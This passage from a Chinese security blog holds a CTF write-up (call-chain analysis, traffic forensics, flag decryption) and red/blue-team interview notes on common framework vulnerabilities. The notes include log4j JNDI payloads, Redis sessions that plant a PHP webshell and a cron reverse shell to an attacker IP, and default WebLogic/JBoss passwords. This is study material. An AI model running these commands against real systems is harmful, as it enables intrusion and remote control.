os\n\n# the o mean is 0!\n\nclass tree_0aB30386():\n    def tree_o02aA7B4(self):\n        if -1705 < 2926:\n            tree_b270co58.tree_f79D6eB3(self)\n\nclass tree_51o1oA3a():\n    def tree_433218o8(self):\n        if 1793 < -5366:\n            tree_B813Fe08.tree_AaA1b735(self)\n\nclass tree_2598o3do():\n    def tree_7C0ooB75(self):\n        if -7226 > -7705:\n            tree_3482o9ob.tree_0d6aDA0F(self)\n\nclass tree_0a351C93():\n    def tree_39cD9171(self):\n        if 9865 < 592:\n            tree_Coc29fcC.tree_22E98104(self)\n\nclass tree_170EE546():\n    def tree_70759F44(self):\n        if -8714 < 4093:\n            tree_8D0oE9Cf.tree_2F7682e6(self)\n```\n\n且存在部分函数调用`os.system`，执行的语句均为`cat /*`\n\n除了`os`函数外，其他函数都存在一个`if`，判断成功时引用下一个类\n\n例如：\n\n```python\nimport random\nimport os\nimport ast\n\n\nclass tree_91fo80eD():\n   def tree_7040e9o9(self):\n       os.system('cat /*')\n\n\nclass tree_88eF054e():\n   def tree_o00o0b68(self):\n       tree_91fo80eD.tree_7040e9o9(self)\n\n\nclass tree_1a0c10D0():\n   def tree_4Cc0o1Do(self):\n       tree_88eF054e().tree_o00o0b68(self)\n```\n\n这段代码的完整利用链为：\n`tree_1a0c10D0.tree_4Cc0o1Do() -> tree_88eF054e.tree_o00o0b68() -> tree_91fo80eD.tree_7040e9o9()`\n\n\n所以我们需要分析代码，找到最终触发`os.system`的利用链，并提取出来\n\n同时对所有`os.system`语句标记污点，如果遇到`if`判断错误的，则直接取消污点标记，并一直往上寻找最终利用链，并记录类名、函数名和函数内的具体内容\n\n根据提示`# the o mean is 0!`，提取所有完整利用链的类名的后8位十六进制字符，并将o转化为0\n\n```python\nimport ast\nimport sys\nimport astor\n\n# 解析Python文件，获取语法树\nwith open(\"tree.py\", \"r\") as file:\n   source_code = file.read()\nsyntax_tree = ast.parse(source_code)\n\n# 初始化类名和函数字典\nclass_dict = {}\n\n# 遍历语法树，获取类和函数名\nfor node in syntax_tree.body:\n   if isinstance(node, ast.ClassDef):\n       class_name = node.name\n       class_dict[class_name] = {}\n       for inner_node in node.body:\n           if isinstance(inner_node, ast.FunctionDef):\n               func_name = inner_node.name\n               class_dict[class_name][func_name] = []\n               for code in inner_node.body:\n                   class_dict[class_name][func_name].append(astor.to_source(code).strip())\n\n# 输出结果\n\nclass_keys = []\nfor func_dict in class_dict.items():\n   if 'os.system' in str(func_dict):\n       sub = func_dict[1][list(func_dict[1].items())[0][0]][0].split('\\n')[0].split(' ')\n       if sub[2] == '>':\n           if int(sub[1]) < int(sub[3][:-1]):\n               continue\n       elif sub[2] == '<':\n           if int(sub[1]) > int(sub[3][:-1]):\n               continue\n       class_keys.append(func_dict[0])\n\nfor key in class_keys:\n   class_key = key\n   func_key = list(class_dict[class_key])[0]\n   list_class = [class_key]\n   flag = 1\n   flags = 0\n   while flag != 0 and flags == 0:\n       flag = 1\n       flags = 0\n       for func_dict in class_dict.items():\n           for code in func_dict[1].items():\n               # print(func_dict[1].items(), flag)\n               if class_key in code[1][0] and func_key in code[1][0]:\n                   sub = code[1][0].split('\\n')[0].split(' ')\n                   if sub[2] == '>':\n                       if int(sub[1]) < int(sub[3][:-1]):\n                           flag = -1\n                   elif sub[2] == '<':\n                       if int(sub[1]) > int(sub[3][:-1]):\n                           flag = -1\n                   flags = 2\n                   func_key = code[0]\n                   class_key = func_dict[0]\n                   # print(func_key, class_key)\n                   # print(func_key, class_key)\n                   list_class.append(class_key)\n                   # print(list_class)\n       else:\n           # print(flag, flags)\n           if flag == -1:\n               flags = 1\n           if flags == 2:\n               flags = 0\n               continue\n           if flag == 1 and flags == 0:\n               break\n   # 将完整利用链的类名，去除tree_，o改为0，按照顺序输出成字符串\n   if flag != -1:\n       for cla in list_class:\n           print(cla[5:].replace('o', '0'), end='')\n       print('')\n```\n\n最终得到两条完整的利用链\n```text\n7468652070617373776f7264206973203730383532613933613336343963613736653335626138353833376566613135\n```\n\n```text\n377aBCAf271c00041373e10830000000000000006A0000000000000057Acbd47A5c4CDB728a43AF6d91D92D25519Bac7876E97909B633223d3A1d7417A3a741ddAfB0E9A7F0b25C726085149ad1da4D40104060001093000070B0100022406F1070112530f9A96C63163E0Df042FD12EC0b32431902121010001000C2A2600080a017088A4910000050119010011130066006c00610067002e0074007800740000001900140a01008B43f758BE7Ad901150601002000000000000000\n```\n\n转字符串后发现一个为`7z`文件，一个为`the password is 70852a93a3649ca76e35ba85837efa15`，解压得到flag\n\n\n\n\n## hacker_traffic\n\n在第4615条流中发现flag.zip\n\n![](/img/wp/2023/2023ningbo-10.png)\n\n\n注释内容：`password is (md5(virus_file) + lhost_ip)`\n\n同时发现流量中有很多elf文件，使用tshark或者python提取\n\n这里使用binwalk，但是需要注意部分binwalk版本不能提取elf文件\n\n需要修改`/usr/lib/python3/dist-packages/binwalk/config/extract.conf`文件(以kali默认位置为例)\n\n![](/img/wp/2023/2023ningbo-11.png)\n\n\n共提取出100个elf文件，且每个elf文件运行后都会打印一个md5值\n\n使用tcpdump监听后运行所有elf文件\n`tcpdump -tttt -s0 -X -vv -w t.pcap`\n\n```shell\n#!/bin/bash\n\n# 使用find命令查找当前文件夹下所有的elf文件\nelf_files=$(find . -maxdepth 1 -type f -executable -name \"*.elf\")\n\n# 使用循环依次执行每一个elf文件\nfor file in $elf_files\ndo\n  echo \"Executing $file\"\n  ./$file\ndone\n```\n\n![](/img/wp/2023/2023ningbo-12.png)\n\n\n分析`t.pcap`文件，发现只有`22E7CF.elf`访问了`192.168.3.201`这个ip\n\n![](/img/wp/2023/2023ningbo-13.png)\n\n\n将文件md5和地址拼接后解压提示密码错误，是因为tcp传输文件会有冗余，需要计算elf文件的真正大小\n\nreadelf读文件\n\n![](/img/wp/2023/2023ningbo-14.png)\n\n得到\n\n```text\nStart of section headers:          14736 (bytes into file)\nSize of section headers:           64 (bytes)\nNumber of section headers:         30\n```\n\n参考文章：[计算机原理系列之二 ——– 详解ELF文件](https://luomuxiaoxiao.com/?p=139)\n\n计算得到`14736+64*30=16656字节`\n\n16656即4110(16进制)，将冗余的数据去除\n\n![](/img/wp/2023/2023ningbo-15.png)\n\n\n计算真正的md5\n\n![](/img/wp/2023/2023ningbo-16.png)\n\n拼接起来，得到`0f82ecb23adc35a4a5e3d8bdabbafe15192.168.3.201`\n\n解压得到一个py脚本\n\n```python\nfrom flag import secret\nkey = \"x.x.x.x\"\n\n\ndef encrypt_flag(flag, key):\n    random.seed(key)\n    table = list(range(0, 38))\n    random.shuffle(table)\n    flag = [flag[i] for i in table]\n    ascii_flag = [ord(c) for c in flag]\n    random.seed(key)\n    xor_key = random.randint(0, 255)\n    encrypted_flag = [c ^ xor_key for c in ascii_flag]\n    return base64.b64encode(bytes(encrypted_flag)).decode(\"ascii\")\nprint(encrypt_flag(flag, key))\n# VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=\n```\n\n伪随机+shuffle生成s盒进行的置换异或加密\n\n根据`key=\"x.x.x.x\"`可知key就是ip地址，为`192.168.3.201`\n\n```python\nimport base64\nimport random\n\n\ndef decrypt_flag(encrypted_flag, key):\n   random.seed(key)\n   table = list(range(0, 38))\n   random.shuffle(table)\n   # 解码base64编码的字符串\n   encrypted_flag = base64.b64decode(encrypted_flag.encode(\"ascii\"))\n\n   # 随机生成一个密钥\n   random.seed(key)\n   xor_key = random.randint(0, 255)\n\n   # 对加密后的ASCII码列表进行异或运算\n   decrypted_flag = [c ^ xor_key for c in encrypted_flag]\n\n   # 将异或后的ASCII码列表转换成字符列表\n   flag = ''.join([chr(c) for c in decrypted_flag])\n   final_flag = [0]*38\n   for i in range(0, len(table)):\n       final_flag[table[i]] = flag[i]\n\n   # 返回解密后的flag字符串\n   return ''.join(final_flag)\n\nkey = \"192.168.3.201\"\ntext = 'VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE='\nflag = decrypt_flag(text, key)\nprint(flag)\n```\n","tags":["wp","宁波","2023竞赛"],"categories":["wp"]},{"title":"hw面试题","url":"/posts/2109a2ab/","content":"\n# 框架漏洞\n\n## shiro反序列化原理\n\n**Shiro-550**\n\n特征：返回包中会包含rememberMe=deleteMe字段，大多会发生在登录处\n\n原理：AES加密的密钥Key被硬编码在代码里，表示每个人都可以通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞\n\n\n影响版本：Apache Shiro < 1.2.4\n\n\n\n**Shiro-721**\n\n默认通过AES-128-CBC模式加密，且ase加密的key基本猜不到了，是系统随机生成的\n\n通过Padding Oracle Attack攻击可以实现破解AES-CBC加密过程进而实现rememberMe的内容伪造\n\n\n**shiro不出网：构造回显，注入内存马**\n\n\n## struts2\n\n**S2-001**\n\n用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。\n\n\n影响范围：Struts 2.0.0 ～ Struts 2.0.8\n\npayload：%{1+1}\n\n漏洞修复：增加了对OGNL递归解析次数的判断，默认情况下只会解析第一层\n\n\n**ognl**\n\n\nOGNL是Object Graphic Navigation Language(对象导航图语言)的缩写，他是一个开源项目。Struts框架使用OGNL作为默认的表达式语言。\n\n**OGNL特点**\n应用于Java中的一个开源的表达式语言（Expression Language）；它被集成在Struts2等框架中，作用是对数据进行访问，它拥有类型转换、访问对象方法、操作集合对象等功能。\n\n**OGNL安全**\n由于OGNL能够创建或更改可执行代码，因此能够为使用它的任何框架引入严重的安全漏洞。多个Apache Struts 2版本容易受到OGNL安全漏洞的攻击。\n\nS2-001、S2-003等部分版本均因OGNL问题导致出现漏洞。\n\n\n## fastjson\n\nFastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象\n\nFastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。\n\n通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。\n\n**fastjson 1.2.24反序列化导致任意命令执行漏洞（CVE-2017-18349）**\n影响版本：Fastjson < 1.2.25\nfastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。\n\n**不出网**\n内存Webshell命令执行回显（回显在HTTP响应中）\n\n\n## log4j2\n\n利用log4j2的日志输出jndi远程对象时，调用远程对象没做检查导致\n\n\n当用户输入信息时，log4j2 组件会将信息记录到日志中，假如日志中含有该语句 ${jndi:ldap:192.168.96.1:1099/shell}，log4j 就会去解析该信息，通过 jndi 的 lookup () 方法去解析该 URL：ldap:192.168.96.1:1099/shell\n\n解析到 ldap，就会去 192.168.96.1:1099 的 ldap 服务找名为 shell 的资源，如果找不到就会去 http 服务中找，在 http 中找到 shell 之后，就会将资源信息返回给应用程序的 log4j 组件，而 log4j 组件就会下载下来，然后发现 shell 是一个.class 文件，就会去执行里面的代码，从而实现注入\n\n\n**log4j2不出网利用**\n\n利用报错回显\n\n```text\nJndiManager.lookup中name是protocal://host:port/path\n其中port本该是int如果给它无法转int的字符串就会抛出这里的信息\n又联想到${}是支持嵌套标签的，这里嵌入真正想要得到的结果，即可抛出执行结果\n根据这个思路，成功在Tomcat项目中回显执行结果（例如这里的${java:version}）\n能够回显的Payload是这样：${jndi:ldap://x.x.x.x:${java:version}/xxx}\n```\n\n\n**log4j2 waf绕过**\n\n有可能对`${`、`jndi`、`ldap`、`rmi`等关键词规则进行防护\n\n但是Jackson和fastjson有unicode和hex的编码特性。\n\n```json\n{\"key\":\"\\u0024\\u007b\"}\n{\"key\":\"\\x24\\u007b\"}\n```\n\n\n## weblogic\n\n**1：weblogic弱口令**\nsystem/password\nweblogic/weblogic\nadmin/security\n\n\n**2：weblogic XMLDecoder反序列化漏洞 CVE-2017-10271**\n\n影响版本：10.3.6.0.0，12.1.3.0.0,12.2.1.1.0,12.2.1.2.0\n漏洞判断方法：\n/wls-wsat/CoordinatorPortType11\n\n\n**3：weblogic任意文件上传 CVE-2018-2894**\n\n漏洞影响： 10.3.6.0  12.1.3.0 12.2.1.2 12.2.1.3\n漏洞特征：ws_utc/begin.do，/ws_utc/config.do\n\n\n**4：weblogic反序列化远程代码执行漏洞 CVE-2019-2725**\n\n漏洞影响版本：Oracle WebLogic Server 10.*  /  Oracle WebLogic Server 12.1.3\n影响组件：bea_wls9_async_response.war   /   wsat.war\n\n\n**5：weblogic未授权漏洞：CVE-2020-14882 weblogic命令执行漏洞：CVE-2020-14883**\n\n漏洞影响版本：Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0\n总结：1. 通过静态资源来绕过权限验证，防止被重定向到登陆界面。2. 通过请求 .portal ，控制处理的 Servlet 是渲染 UI 的 MBeanUtilsInitSingleFileServlet 。3. 通过编码后的 ../ ，让最终渲染的模版是 console.portal\n\n\n**6：Weblogic Server远程代码执行漏洞 CVE-2021-2109**\n\n影响版本： 10.3.6.0.0  12.1.3.0.0 12.2.1.3.0 12.2.1.4.0 14.1.1.0.0\n漏洞poc：以get方式请求http://192.168.116.133:7001/console/css/%252e%252e%252f/consolejndi.portal\n\n\n最新漏洞：Weblogic 远程代码 执行漏洞（CVE-2023-21931）\n\n\n## Jboss\n\n**JBoss控制台弱口令**\n\njmx-console：admin/admin、jboss/jboss\nadmin-console：admin/admin、jboss/jboss\n\n\n**后台部署war包GetShell**\n\n进入jmx-console后台；\n找到jboss.deployment，点击flavor=URL,type=DeploymentScanner；\n找到void.addURL()，在输入框中写入一个war包地址，war包包含一个webshell；\n点击invoke获取一个jsp的webshell地址；\n\n\n\n**JBoss反序列化**\n\n反序列化主要影响JBoss5.x和JBoss6.x\n\n该漏洞为Java反序列化错误类型,存在于jboss的HttpInvoker组件中的ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化,从而导致了漏洞。\n\n\n## ThinkPHP\n\nthinkphp2.x/3.0  远程代码执行漏洞\nthinkphp3系列 sql注入漏洞\nthinkphp5 远程代码执行漏洞\nthinkphp6 任意文件操作漏洞\nthinkphp6 反序列化漏洞\n\nThinkPHP近年出现的高风险漏洞主要存在于框架中的函数\n\n## Spring\n\n**1：Spring Security OAuth2 远程命令执行（CVE-2016-4977）**\n构造恶意SpEL表达式可以触发远程代码执行漏洞\n\n**2：Spring Web Flow框架远程代码执行(CVE-2017-4971)**\n如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行\n\n**3：Spring Data Rest远程命令执行命令(CVE-2017-8046)**\nSpring-data-rest服务器在处理PATCH请求时，攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。\n\n**4：Spring Messaging远程命令执行突破(CVE-2018-1270)**\nSTOMP消息代理在处理客户端消息时存在SpEL表达式注入漏洞\n\n**5：Spring Data Commons远程命令执行漏洞(CVE-2018-1273)**\nSpring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。\n\n\n**SpringBoot env 获取\\* 敏感信息**\n**SpringBoot Actuator JNDI RCE**\n\n\n\n## Redis\n\nRedis，英文全称是Remote Dictionary Server（远程字典服务）\n\n**1、REDIS 未授权访问**\nredis未授权访问是一种因配置导致的漏洞，不需要使用密码则可以访问该redis组件，常见的redis只能在内网访问，所以该漏洞通常和ssrf组合。\nps：针对redis弱密码也可以进行爆破\n不管通过未授权访问还是爆破进入redis组件，都是第一步，需要进行下一步的攻击，获得更好的shell环境。\n\n**(1) redis写webshell**\n当redis权限不高，但是该主机有web服务，redis有权限向web目录写入文件，并且知晓web物理路径时，可以写入webshell。\n```redis\n192.168.63.130:6379> config set dir /var/www/html/\nOK\n192.168.63.130:6379> config set dbfilename shell.php\nOK\n192.168.63.130:6379> set x \"<?php phpinfo();?>\"\nOK\n192.168.63.130:6379> save\nOK\n```\n\n**(2) redis 写任务计划**\n\n当redis 以root权限进入，可以写任务计划，进行反弹shell\n```\nroot@kali:~# redis-cli -h 192.168.63.130\n192.168.63.130:6379> set x \"\\n* * * * * bash -i >& /dev/tcp/192.168.63.128/7999 0>&1\\n\"\nOK\n192.168.63.130:6379> config set dir /var/spool/cron/\nOK\n192.168.63.130:6379> config set dbfilename root\nOK\n192.168.63.130:6379> save\nOK\n```\n\n**(3) redis 写 ssh-keygen 公钥**\n\n当redis 以root权限进入，并且开放了ssh服务，允许使用密钥登录。\nps ssh有两种登录方式一种是账号密码登录，一种是密钥登录\n\n\n**(4) redis 命令执行**\n\nredis < 2.6 内置lua，可通过lua脚本执行系统命令\n\n\n**2、主从复制RCE**\n在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。\n\n1.本地编译好外部扩展即so文件2.把so文件转码存入本地redis数据库3.到目标服务器上设置主从关系，主服务器指定我们的本地机子4.待同步后，设置备份路径和备份文件名（xx.so）5.开始同步，备份数据库6.然后加载备份数据库7.然后就可以通过redis执行命令反弹shell了\n\n\n## nginx\n**1、文件解析**\n对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。\n\n**2、目录遍历**\nNginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露\n\n**3、CRLF注入**\nHTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。\n通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。\n\n**4、目录穿越**\nNginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。\n\n\n## tomcat\n**1、远程代码执行**\nTomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。\n影响版本： Apache Tomcat 7.0.0 – 7.0.81\n\n**2、war后门文件部署**\nTomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。\n若后台管理页面存在弱口令，则可以通过爆破获取密码。\n\n\n## apache\n**1、解析漏洞**\nApache文件解析漏洞与用户的配置有密切关系，严格来说属于用户配置问题\n右边的后缀无法识别，则继续向左识别\n\n**2、目录遍历**\n由于配置错误导致的目录遍历\n\n\n## iis\n**1、PUT漏洞**\nIIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。\n版本： IIS6.0\n\n**2、短文件名猜解**\nIIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。\n\n**3、远程代码执行**\n在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。\n\n**4、解析漏洞**\nIIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞\n/test.asp/test.jpg\ntest.asp;.jpg\n\n\n## 其他中间件相关漏洞\n**1、FastCGI未授权访问、任意命令执行**\n服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。\n\n**2、PHPCGI远程代码执行**\n在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。\n此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。\n\n\n\n# 安全设备\n\nwaf：Web Application Firewall\nAF：下一代防火墙。部署在边界，同步安全数据给SIP；接收SIP下发的安全策略，封堵攻击流量\nEDR：终端安全响应。部署在硬件或虚拟化服务器上，同步终端安全数据给SIP；接收SIP下发策略，查杀恶意程序\nSIP：安全感知平台。负责收集汇总探针、防火墙等各类安全组件数据\nSTA：潜伏威胁探针。旁路部署在关键网络节点，镜像交换机流量，对全流量进行检测，提取有效数据上报给SIP\nAC：上网行为管理系统。\nDAS：数据库安全审计平台。\nLAS：日志审计安全平台。\nHIDS：基于主机的入侵检测系统。\nNIDS：基于网络的入侵检测系统。\n\n-------------------------------\n\n安恒明御waf\n绿盟isop智能安全运营平台，UTS 综合威胁探针\n奇安信网神云锁\n深信服AF(下一代防火墙)，EDR（终端检测响应平台），SIP（安全感知平台）\n360网康/网神防火墙\n\n\nwaf工作在应用层\n\nWAF和IPS的区别：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但无法有效应对应用层的深层攻击。IPS是对防火墙的补充，综合能力更强；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。\n\n\n# 基础漏洞\n\n## 常见脆弱端口\n\n20：ftp data\n21：ftp\n22：ssh\n23：telnet\n25：smtp\n53：dns\n1433：mssql\n1521：oracle\n3306：mysql\n3389：windows远程桌面 mstsc\n7701：weblogic\n6379：redis\n5432：postgresql\n\n## 日志\n\nLinux日志默认存放位置：/var/log/\n查看可登录的账户 cat/etc/passwd|grep ‘/bin/bash’\n查看所有用户最后的登录信息 lastlog\n查看用户最近登录信息 last 其中，/var/log/wtmp 存储登录成功的信息、btmp 存储登录失败的信息、utmp 存储当前正在登录的信息\n查看当前用户登录系统情况 who\n\nWindows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志\n系统日志： %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx\n应用程序日志： %SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx\n安全日志： %SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx\n\n**windows日志分析工具**\nLog Parser、LogParser Lizard、Event Log Explorer\n\n\n## Shell管理工具流量特征\n\n**菜刀的流量特征**\n1. payload在请求体中，采用url编码+base64编码，payload部分是明文传输。\n2. payload中有eval或assert、base64_decode这样的字符。\n3. payload中有默认固定的&z0=QGluaV9zZXQ...这样base64加密的攻击载荷，参数z0对应$_POST[z0]接收到的数据，且固定为QGluaV9zZXQ开头。进行base64解码后可看到代码：@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);这段意思是首先关闭报错和magic_quotes，接下来去获取主机的信息。\n\n\n**蚁剑的流量特征**\n1. 请求时可选择多种编码器，如果采用默认的方式，则仅进行url编码。\n2. 进行连接时会进行两次请求，第一次请求的payload和菜刀相似，也是@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);意思是关闭报错和magic_quotes，接下来区获取主机信息。这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码。\n3. 第二次请求会把主机的目录列出来。\n4. 由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x.....=”这种形式（下划线可替换为其他）所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。\n\n\n\n**冰蝎的流量特征**\n冰蝎2.0：\n1. 使用 AES加密+base64编码发起三次请求。第一次GET请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的。第二次GET请求是为了获取密钥 key，服务端会生成16位的AES密钥。第三次使用 key 的AES加密进行通信，通信也采用了base64编码。\n2. 进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。\n\n\n冰蝎3.0：\n1. 使用AES加密+base64编码发起两次请求。与冰蝎2.0相比，冰蝎3.0取消了动态密钥获取的请求，AES的密钥直接固定为连接密码32位md5的前16位，默认连接密码是\"rebeyond\"(即密钥是md5('rebeyond')[0:16]=e45e329feb5d925b)。服务端和客户端不再进行密钥的交互传递。两次请求中，第一次请求用于判断是否可以建立连接。第二次发送 phpinfo 等代码执行，获取网站的信息。\n2. 与冰蝎2.0相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。连接jsp的webshell的请求数据包中的content-type字段常见为application/octet-stream。\n\n\n冰蝎4.0：\n1. 提供了传输协议自定义的功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。v4.0版本不再有连接密码的概念，自定义传输协议的算法就是连接密码。\n2. Accept字段（弱特征），通常是Accept: application/json, text/javascript, */*; q=0.01 意思是浏览器可接受任何文件，但最倾向application/json 和 text/javascript。\n3. Content-Type字段（弱特征），通常是Content-type: Application/x-www-form-urlencoded\n4. 与冰蝎的前述版本相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。\n5. 连接的端口有一定的特征，冰蝎与webshell建立连接的同时，java也与目的主机建立tcp连接，每次连接使用本地端口在49700左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。\n6. 使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive\n7. 有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd\n8. 默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥，与冰蝎3.0相同。\n\n\n\n\n\n**哥斯拉的流量特征**\n1. 支持多种加密，采用了和冰蝎 2.0 类似的密钥交换方式，哥斯拉建立连接时会发起三次请求，第一次请求数据超级长，用于建立 session，第二三次请求确认连接，第二、三次的请求和响应基本是一致的。\n2. User-Agent字段（弱特征），如果采用默认的情况，会暴露使用的jdk信息。不过哥斯拉支持自定义HTTP头部，这个默认特征是可以很容易去除的。\n3. Accept字段（弱特征），默认是Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2。同上，这个也可修改，只能作为辅助检测的特征。\n4. Cookie中有一个非常关键的特征，最后会有个分号。估计后续的版本会修复。\n5. 响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。\n\n\n\n**CS的流量特征**\nCS会定期向C2服务器发送心跳包，以保持与服务器的连接。默认间隔为60秒\n\nUA头特征（老版）\nCS 4.0版本的UA头是固定的，可以作为特征。但是CS 4.5及以上版本中，每个木马都会随机生成一个UA头，避免被蓝队检测到\n\n下发指令\n攻击者执行命令下发指令时，你会看到木马访问攻击者C2服务器上的submit.php页面，并且在访问请求中带有一个id参数。这就是CS下发指令的特征之一\n\n\n\n\n\n## 常见的web漏洞\n文件上传，命令执行，sql注入，xss，xxe，ssti，ssrf，csrf，水平/垂直权限绕过，逻辑漏洞\n\n\n## 文件上传绕过\n前端js绕过，Content-Type(image/png) , 文件头，文件名大小写，黑名单绕过（phtml，pht，php5），.htaccess/.user.ini，条件竞争，图片二次渲染，apache，iis（*.asp,分号后忽略）解析漏洞\n00截断（php版本要小于5.3.4，magic_quotes_gpc需要为OFF状态）\n\n\n## sql注入\n\n**sql注入的类型**\n\n宽字节注入，联合注入，堆叠注入，时间盲注，布尔盲注，报错注入，cookie注入，XFF头注入，UA注入（user-agent注入），Referer注入，二次注入，base64注入，万能密码，文件读写\n\n**1.UNION 联合注入**\n用于将多个select语句的结果组合起来，每条select语句必须拥有相同的列、相同数量的列表达式、相同的数据类型，并且出现的次序要一致，长度不一定相同。\n\n**2.堆叠注入**\n堆叠查询可以执行多条语句，多条语句之间以分号隔开。堆叠注入就是利用在一条查询语句结束之后，在语句末尾加入分号之后再插入恶意的SQL语句\n\n**3.宽字节注入**\nGB2312，GBK，GB18030，BIG5等这些都是常见的宽字节，实际为2字节\n如果使用了类似于set names gbk这样得语句，此时mysql数据库就会将Ascii大于128（%df）的字符当作汉字字符的一部分，从而能吃掉\\，引入单引号或者双引号\n\n\n**1.时间盲注**\nsleep()、benchmark()\n\n**2.布尔盲注**\nexists()、ascii()、substr()、length()、left()、regexp()\n\n**3.延时函数**\nlength()、substr()、ascii()、if()、sleep()\n\n**4.常用的报错函数**\nupdatexml() 是mysql对xml文档数据进行查询和修改的xpath函数\nextractvalue() 是mysql对xml文档数据进行查询的xpath函数\nfloor() mysql中用来取整的函数\nexp() 此函数返回e(自然对数的底)指数X的幂值\n支持报错注入的数据库：Access/MySQL/SQLServer/Oracle/PostgreSQL/DB2/SQLite/Informix\n\n**mysql 5.0以上和下的区别**\nmysql5.0以及5.0以上的版本都存在一个系统自带的系统数据库,叫做:information_schema,而5.0以下的版本不存。information_schema下面又包含了这几张表:schemata、tables、columns。\n\n\n**sqlmap**\nsqlmap支持五种不同的注入模式：\n1：boolean-based blind（布尔型注入）\n2：time-based blind（基于时间型盲注）\n3：error-based（报错型注入）\n4：UNION query-based（联合注入）\n5：stacked queries and out-of-band（堆叠注入）\n\n设置回显等级 参数：-V 默认为1\n设置HTTP数据包相关参数 参数：--data\n列数据库管理用户 参数 --users\n指定一个代理服务器 参数 --proxy\n判断当前的用户是否为管理 参数 --is-dba\n使用shell命令 参数 --os-shell\n\n1、apostrophemask.py ：将引号替换为UTF-8,用于过\n滤单引号。\n2、base64encode.py 